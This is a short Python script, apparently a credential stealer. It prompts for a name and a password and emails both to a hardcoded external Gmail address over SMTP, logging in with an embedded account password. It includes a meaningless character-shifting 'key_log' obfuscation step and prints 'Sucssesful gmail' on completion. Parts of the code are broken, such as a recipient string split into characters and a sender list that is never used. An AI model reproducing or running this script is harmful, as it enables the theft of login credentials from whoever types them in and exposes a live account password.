#from email.message import EmailMessage
import smtplib
import random
 
s1=input("write:")
s2=input("write2:")
liste=["name:"+s1,"password:"+s2]
gmail_liste=["server.smtp1212@gmail.com",
        "server12.insta@gmail.com",
        "server.ip18@gmail.com",
        "serverport0@gmail.com"]
number=random.randint(0,3)

# key numbers
server_smtp="serverq1q2q3"
system=""
for sys in server_smtp:#1
    system=system+chr(ord(sys) -10)
####################################
system_231=""
for sys2 in system:
    system_231=system_231 + chr(ord(sys2) +10)
key_log=system_231


def gmail():
    #servr_gmailes
    form="python.py2001@gmail.com"
    email=gmail_liste[int(number)]
    #gonderilen yer
    to="sayepzero@gmail.com"
    #messsage
    #text=random.choice(listes)
    #fromlar
    msg='''\
    From: %s
    TO: %s 
    %s 
    ''' %(form+"\n",",".join(to)+"\n",liste)

    with smtplib.SMTP("smtp.gmail.com",587) as server:
        server.ehlo()
        server.starttls()
        server.login("python.py2001@gmail.com","adminq1q2q3")
        server.sendmail(form,to,msg)
#import time
gmail()
print("Sucssesful gmail") 
    


